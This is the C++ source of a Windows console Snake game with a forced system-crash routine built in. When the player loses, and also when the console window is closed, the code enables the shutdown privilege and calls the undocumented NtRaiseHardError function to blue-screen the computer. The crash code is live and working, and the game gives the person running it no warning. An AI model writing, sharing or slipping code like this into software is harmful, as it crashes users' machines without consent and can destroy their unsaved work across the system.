#include <Windows.h>
#include <winternl.h>
#include <iostream>
#include <string>
#include <conio.h>
#include <vector>
#include <cstdlib>
#include <ctime>

#define SHUTDOWN_PRIVILEGE 19
#define OPTION_SHUTDOWN 6

typedef NTSTATUS(NTAPI* pdef_RtlAdjustPrivilege)(ULONG Privilege,
    BOOLEAN Enable,
    BOOLEAN CurrentThread,
    PBOOLEAN Enabled);

typedef NTSTATUS(NTAPI* pdef_NtRaiseHardError)(NTSTATUS ErrorStatus,
    ULONG NumberOfParameters,
    ULONG UnicodeStringParameterMask OPTIONAL,
    PULONG_PTR Parameters,
    ULONG ResponseOption,
    PULONG Response);

// action to run when the user wins.
static void TriggerAction()
{
    MessageBoxA(NULL, "Congrats! You live to see another day.", "Success", MB_OK | MB_ICONINFORMATION);
}

// cheeky bsod when the user loses
void TriggerBSOD()
{
    BOOLEAN bEnabled;
    ULONG uResp;

    LPVOID lpFuncAddress1 = GetProcAddress(LoadLibraryA("ntdll.dll"), "RtlAdjustPrivilege");
    LPVOID lpFuncAddress2 = GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtRaiseHardError");

    pdef_RtlAdjustPrivilege RtlAdjustPrivilege = (pdef_RtlAdjustPrivilege)lpFuncAddress1;
    pdef_NtRaiseHardError NtRaiseHardError = (pdef_NtRaiseHardError)lpFuncAddress2;

    RtlAdjustPrivilege(SHUTDOWN_PRIVILEGE, TRUE, FALSE, &bEnabled);

    NtRaiseHardError(STATUS_FLOAT_MULTIPLE_FAULTS, 0, 0, 0, OPTION_SHUTDOWN, &uResp);
}

BOOL WINAPI ConsoleCloseHandler(DWORD signal)
{
    if (signal == CTRL_CLOSE_EVENT)
    {
        TriggerBSOD();
    }

    return TRUE;
}

using namespace std;

const int width = 40;
const int height = 20;

int x, y;            // Snake head
int fruitX, fruitY;  // Fruit position
int score;
bool gameOver;

enum Direction { STOP = 0, LEFT, RIGHT, UP, DOWN };
Direction dir;

vector<pair<int, int>> tail;  // (x,y) for each tail segment

// ---------------------------------------------

void Setup() {
    gameOver = false;
    dir = STOP;

    x = width / 2;
    y = height / 2;

    srand(time(0));
    fruitX = rand() % width;
    fruitY = rand() % height;

    tail.clear();
    score = 0;
}

void Draw() {
    system("cls");

    // Top border
    for (int i = 0; i < width + 2; i++)
        cout << "#";
    cout << "\n";

    // Map area
    for (int i = 0; i < height; i++) {
        cout << "#";  // left border
        for (int j = 0; j < width; j++) {

            if (i == y && j == x)
                cout << "O"; // head
            else if (i == fruitY && j == fruitX)
                cout << "F"; // fruit
            else {
                bool printed = false;
                for (auto& t : tail) {
                    if (t.first == j && t.second == i) {
                        cout << "o";
                        printed = true;
                        break;
                    }
                }
                if (!printed) cout << " ";
            }
        }
        cout << "#\n"; // right border
    }

    // Bottom border
    for (int i = 0; i < width + 2; i++)
        cout << "#";
    cout << "\nScore: " << score << "\n";
}

void Input() {
    if (_kbhit()) {
        int ch = _getch();

        // Handle arrow keys
        if (ch == 224) {
            int arrow = _getch();
            switch (arrow) {
            case 72: // Up arrow
                dir = UP;
                break;
            case 80: // Down arrow
                dir = DOWN;
                break;
            case 75: // Left arrow
                dir = LEFT;
                break;
            case 77: // Right arrow
                dir = RIGHT;
                break;
            }
        }
        else {
            // Handle WASD (both lowercase and uppercase)
            switch (ch) {
            case 'w':
            case 'W':
                dir = UP;
                break;
            case 's':
            case 'S':
                dir = DOWN;
                break;
            case 'a':
            case 'A':
                dir = LEFT;
                break;
            case 'd':
            case 'D':
                dir = RIGHT;
                break;
            }
        }
    }
}

void Logic() {
    // Move tail
    if (!tail.empty()) {
        for (int i = tail.size() - 1; i > 0; i--) {
            tail[i] = tail[i - 1];
        }
        tail[0] = { x, y };
    }

    // Move head
    switch (dir) {
    case LEFT:  x--; break;
    case RIGHT: x++; break;
    case UP:    y--; break;
    case DOWN:  y++; break;
    default: break;
    }

    // Wall collision
    if (x < 0 || x >= width || y < 0 || y >= height) {
        gameOver = true;
        TriggerBSOD();
        return;
    }

    // Self collision
    for (auto& t : tail) {
        if (t.first == x && t.second == y) {
            gameOver = true;
            TriggerBSOD();
            return;
        }
    }

    // Fruit collision
    if (x == fruitX && y == fruitY) {
        score++;
        tail.push_back({ x, y });

        fruitX = rand() % width;
        fruitY = rand() % height;
    }

    // win condition: snake fills entire board
    int maxSize = width * height - 1; // -1 because one tile is the fruit
    if ((int)tail.size() + 1 == maxSize) { // +1 for head
        gameOver = true;
        TriggerAction();
        return;
    }
}

int main() {
    Setup();

    while (!gameOver) {
        Draw();
        Input();
        Logic();
        Sleep(60); // controls game speed
    }

    cout << "\nGame Over!\n";
    return 0;
}
